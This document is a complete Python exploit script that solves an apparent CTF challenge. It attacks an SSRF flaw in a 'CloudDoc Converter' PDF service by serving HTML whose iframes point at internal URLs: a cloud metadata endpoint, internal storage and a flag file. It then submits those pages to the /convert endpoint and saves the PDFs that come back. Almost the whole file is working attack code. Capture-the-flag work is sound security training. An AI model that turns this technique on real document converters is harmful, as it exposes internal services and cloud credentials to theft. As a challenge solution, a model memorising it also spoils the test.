#!/usr/bin/env python3
"""
CloudDoc Converter - SSRF Exploitation Script
===============================================

This script exploits the SSRF vulnerability in CloudDoc Converter to retrieve the flag.

The vulnerability: The PDF converter fetches and renders HTML from user-provided URLs,
including embedded resources like iframes, allowing access to internal services.

Attack chain:
1. Start local HTTP server to host exploit HTML
2. Create HTML file with iframe pointing to internal service
3. Submit URL to PDF converter via /convert endpoint
4. PDF contains rendered content from internal services
5. Open PDF to view the flag

Usage:
    python exploit.py <target_url>
    
Example:
    python exploit.py http://localhost:3000
"""

import requests
import argparse
import time
import sys
import os
import threading
import shutil
from http.server import HTTPServer, SimpleHTTPRequestHandler
import tempfile
import json

# Color codes
class C:
    H = '\033[95m'  # Header
    B = '\033[94m'  # Blue
    G = '\033[92m'  # Green
    Y = '\033[93m'  # Yellow
    R = '\033[91m'  # Red
    E = '\033[0m'   # End
    BOLD = '\033[1m'

def banner():
    print(f"""
{C.H}{C.BOLD}╔═══════════════════════════════════════════════════════════════╗
║           CloudDoc Converter SSRF Exploit                     ║
║                     CHC CTF Challenge                         ║
╚═══════════════════════════════════════════════════════════════╝{C.E}
""")

def step(num, text):
    print(f"{C.B}[Step {num}]{C.E} {text}")

def success(text):
    print(f"{C.G}[✓]{C.E} {text}")

def error(text):
    print(f"{C.R}[✗]{C.E} {text}")

def warning(text):
    print(f"{C.Y}[!]{C.E} {text}")

def info(text):
    print(f"{C.B}[*]{C.E} {text}")

class QuietHTTPHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress HTTP server logs

def start_http_server(port, directory):
    """Start HTTP server in background thread"""
    class DirectoryHTTPHandler(QuietHTTPHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=directory, **kwargs)
    
    server = HTTPServer(('0.0.0.0', port), DirectoryHTTPHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def create_exploit_html(filename, target_url, description):
    """Create HTML file with iframe to internal service"""
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Document Conversion Request</title>
    <style>
        body {{ 
            font-family: Arial, sans-serif; 
            margin: 20px;
            background: #f5f5f5;
        }}
        .container {{
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        h1 {{ 
            color: #333; 
            border-bottom: 3px solid #667eea;
            padding-bottom: 10px;
        }}
        .info {{
            background: #e8f4f8;
            padding: 15px;
            border-left: 4px solid #3498db;
            margin: 20px 0;
        }}
        iframe {{
            width: 100%;
            height: 600px;
            border: 2px solid #ddd;
            border-radius: 4px;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Document Conversion Service</h1>
        <div class="info">
            <strong>Target:</strong> {description}<br>
            <strong>URL:</strong> {target_url}
        </div>
        <div class="content">
            <iframe src="{target_url}"></iframe>
        </div>
    </div>
</body>
</html>"""
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html_content)

def exploit(target_url):
    """Main exploitation function"""
    banner()
    
    # Validate target
    step(1, "Validating target...")
    try:
        r = requests.get(target_url, timeout=5)
        if r.status_code != 200:
            error(f"Target returned status {r.status_code}")
            return False
        success(f"Target is reachable: {target_url}")
    except Exception as e:
        error(f"Cannot reach target: {e}")
        return False
    
    # Check /health endpoint
    step(2, "Checking service health...")
    try:
        r = requests.get(f"{target_url}/health", timeout=5)
        if r.status_code == 200:
            data = r.json()
            success(f"Service: {data.get('service', 'unknown')} v{data.get('version', 'unknown')}")
    except:
        warning("Could not fetch health endpoint")
    
    # Create temporary directory
    temp_dir = tempfile.mkdtemp(prefix='clouddoc_exploit_')
    info(f"Working directory: {temp_dir}")
    
    # Start HTTP server
    http_port = 9000
    step(3, f"Starting HTTP server on port {http_port}...")
    server = start_http_server(http_port, temp_dir)
    time.sleep(1)
    success(f"HTTP server running on http://0.0.0.0:{http_port}")
    
    # Create exploit files
    step(4, "Creating exploit HTML files...")
    
    exploits = [
        {
            'filename': 'metadata.html',
            'target': 'http://metadata-service/latest/meta-data',
            'description': 'Cloud Metadata Service',
            'output': 'metadata_result.pdf'
        },
        {
            'filename': 'storage.html',
            'target': 'http://internal-storage:8080/api/documents',
            'description': 'Internal Storage Service',
            'output': 'storage_result.pdf'
        },
        {
            'filename': 'flag.html',
            'target': 'http://internal-storage:8080/internal/admin/flag.txt',
            'description': 'FLAG LOCATION',
            'output': 'flag.pdf'
        }
    ]
    
    for exp in exploits:
        filepath = os.path.join(temp_dir, exp['filename'])
        create_exploit_html(filepath, exp['target'], exp['description'])
    
    success("Created 3 exploit HTML files")
    
    # Execute exploits
    step(5, "Executing SSRF attacks...")
    print()
    
    successful_exploits = []
    current_dir = os.getcwd()
    
    for i, exp in enumerate(exploits, 1):
        exploit_url = f"http://host.docker.internal:{http_port}/{exp['filename']}"
        
        info(f"[{i}/3] Exploiting: {exp['description']}")
        info(f"      Target: {exp['target']}")
        
        try:
            payload = {'url': exploit_url}
            r = requests.post(
                f"{target_url}/convert",
                json=payload,
                timeout=30
            )
            
            if r.status_code == 200:
                # Save PDF directly to current directory
                pdf_path = os.path.join(current_dir, exp['output'])
                with open(pdf_path, 'wb') as f:
                    f.write(r.content)
                
                pdf_size = len(r.content)
                success(f"      PDF generated: {exp['output']} ({pdf_size} bytes)")
                
                successful_exploits.append({
                    'name': exp['description'],
                    'file': exp['output'],
                    'path': pdf_path,
                    'size': pdf_size
                })
            else:
                error(f"      Failed with status {r.status_code}")
                
        except Exception as e:
            error(f"      Error: {str(e)[:100]}")
        
        time.sleep(0.5)
    
    print()
    
    # Results
    if successful_exploits:
        step(6, "Exploitation Results")
        print()
        success(f"Successfully generated {len(successful_exploits)} PDFs:")
        print()
        
        for exp in successful_exploits:
            print(f"  {C.Y}►{C.E} {C.BOLD}{exp['name']}{C.E}")
            print(f"    File: {exp['file']}")
            print(f"    Size: {exp['size']:,} bytes")
            print()
        
        # Highlight flag file
        flag_exploit = [e for e in successful_exploits if 'flag' in e['file'].lower()]
        if flag_exploit:
            print(f"{C.G}{C.BOLD}╔═══════════════════════════════════════════════════════╗")
            print(f"║  FLAG RETRIEVED - Open the PDF to view the flag:     ║")
            print(f"║  {flag_exploit[0]['file']:<50} ║")
            print(f"╚═══════════════════════════════════════════════════════╝{C.E}")
            print()
        
        print()
        success(f"{C.BOLD}Exploitation complete! PDFs saved to current directory.{C.E}")
        success(f"{C.BOLD}Open flag.pdf to retrieve the flag!{C.E}")
        
    else:
        error("No exploits succeeded")
        server.shutdown()
        return False
    
    # Cleanup
    print()
    info("Cleaning up...")
    server.shutdown()
    try:
        shutil.rmtree(temp_dir)
    except:
        pass
    
    return True

def main():
    parser = argparse.ArgumentParser(
        description='CloudDoc Converter SSRF Exploitation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python exploit.py http://localhost:3000
  python exploit.py http://target-server.com:3000

The exploit will:
  1. Start a local HTTP server
  2. Create HTML files with iframes to internal services
  3. Submit these files to the PDF converter
  4. Download PDFs containing internal service data
  5. Save flag.pdf containing the CTF flag
"""
    )
    
    parser.add_argument('target', help='Target URL (e.g., http://localhost:3000)')
    parser.add_argument('-p', '--port', type=int, default=9000, 
                       help='Local HTTP server port (default: 9000)')
    
    args = parser.parse_args()
    
    target_url = args.target.rstrip('/')
    
    try:
        success_result = exploit(target_url)
        sys.exit(0 if success_result else 1)
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted by user{C.E}")
        sys.exit(1)
    except Exception as e:
        error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
